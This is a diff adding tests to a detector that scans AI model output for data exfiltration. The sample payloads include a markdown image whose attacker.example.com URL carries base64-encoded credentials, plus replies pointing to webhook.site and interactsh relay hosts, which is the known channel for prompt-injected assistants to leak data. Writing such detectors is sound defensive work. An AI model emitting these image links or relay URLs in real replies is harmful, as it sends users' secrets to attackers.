@@ -143,6 +143,28 @@ class TestOutputFilter:
         score, level, matched = filter_response(response_body)
         assert level == RiskLevel.CRITICAL
 
+    def test_markdown_image_exfiltration_channel(self):
+        # Classic Link Trap / Bing/ChatGPT exfil pattern: encoded data in image URL query param
+        payload = "Here is the result: ![img](https://attacker.example.com/p.png?d=dXNlcjpzZWNyZXQxMjM0NTY)"
+        score, level, matched = filter_output(payload)
+        assert any(r.rule_id == "out_markdown_img_exfil" for r in matched)
+
+    def test_known_exfil_relay_webhook_site(self):
+        payload = "I have sent your data to https://webhook.site/abc-def-123 for collection."
+        score, level, matched = filter_output(payload)
+        assert any(r.rule_id == "out_known_exfil_relay" for r in matched)
+
+    def test_known_exfil_relay_interactsh(self):
+        payload = "Please visit https://attacker.interactsh.com to confirm the request."
+        score, level, matched = filter_output(payload)
+        assert any(r.rule_id == "out_known_exfil_relay" for r in matched)
+
+    def test_clean_image_no_query_params(self):
+        # Legitimate markdown image without query params should NOT trigger exfil pattern
+        clean = "Here is a diagram: ![architecture](https://example.com/diagram.png)"
+        score, level, matched = filter_output(clean)
+        assert not any(r.rule_id == "out_markdown_img_exfil" for r in matched)
+
 
 # ---------------------------------------------------------------------------
 # Custom rules
